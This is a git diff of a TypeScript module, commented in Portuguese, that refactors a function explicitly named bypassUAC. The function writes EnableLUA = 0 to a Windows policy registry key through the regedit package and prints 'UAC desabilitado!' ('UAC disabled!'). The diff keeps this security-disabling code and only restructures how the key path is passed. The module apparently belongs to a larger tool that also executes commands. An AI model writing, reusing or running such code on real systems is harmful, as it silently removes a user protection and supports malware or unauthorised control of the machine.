@@ -26,32 +26,31 @@ const executeCommand = (
 
 const bypassUAC = async () => {
   // Editando uma chave de registro para alterar o comportamento do UAC
-
-  regedit.createKey(
+  const arr = [
     'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
-    function (err: any) {
-      if (err) {
-        console.log('Erro ao editar o registro:', err);
-      } else {
-        regedit.putValue(
-          {
-            'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System':
-              {
-                EnableLUA: {
-                  value: 0,
-                  type: 'REG_DWORD',
-                },
+  ];
+  regedit.createKey(arr, function (err: any) {
+    if (err) {
+      console.log('Erro ao editar o registro:', err);
+    } else {
+      regedit.putValue(
+        {
+          'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System':
+            {
+              EnableLUA: {
+                value: 0,
+                type: 'REG_DWORD',
               },
-          },
-          // @ts-ignore
-          function (err) {
-            if (err) console.log(err);
-            else console.log('UAC desabilitado!');
-          },
-        );
-      }
-    },
-  );
+            },
+        },
+        // @ts-ignore
+        function (err) {
+          if (err) console.log(err);
+          else console.log('UAC desabilitado!');
+        },
+      );
+    }
+  });
 };
 
 export default bypassUAC;
